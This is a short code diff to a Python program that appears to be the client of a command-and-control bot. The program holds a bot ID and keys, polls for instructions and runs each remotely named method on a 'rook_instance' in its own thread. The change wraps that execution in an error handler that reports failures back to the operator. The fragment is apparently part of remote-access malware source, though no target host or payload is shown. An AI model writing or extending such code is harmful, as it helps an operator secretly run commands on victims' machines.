@@ -16,10 +16,13 @@ from payload_conf import modules
 verbose = False
 
 privateKey_client = None
+pattern_key_save = 'result_of_'
 publicKey_server = None
 password = None
 headers = None
 bot_id = None
+
+# Init UTILS
 
 def printI(string):
 
@@ -29,10 +32,25 @@ def printI(string):
 
     return(string)
 
+def execute_init(instance, function, value):
+
+    try:
+
+        getattr(instance, function)(**value)
+
+    except Exception as Except:
+
+        instance.send((pattern_key_save + 'error_' + function), str(Except))
+
+    else:
+
+        printI('Operación: "{}" ejecutada con éxito...'.format(function))
+
+# End UTILS
+
 def loop(rook_instance, sleep_check):
 
     bucle_count = 0
-    pattern_key_save = 'result_of_'
 
     while (True):
 
@@ -73,7 +91,7 @@ def loop(rook_instance, sleep_check):
 
                                         printI('SUCCESS: Ejecutando: "{}"'.format(key))
 
-                                        thread = threading.Thread(target=getattr(rook_instance, key), kwargs=value)
+                                        thread = threading.Thread(target=execute_init, args=(rook_instance, key, value))
                                         thread.start()
 
                                     else:
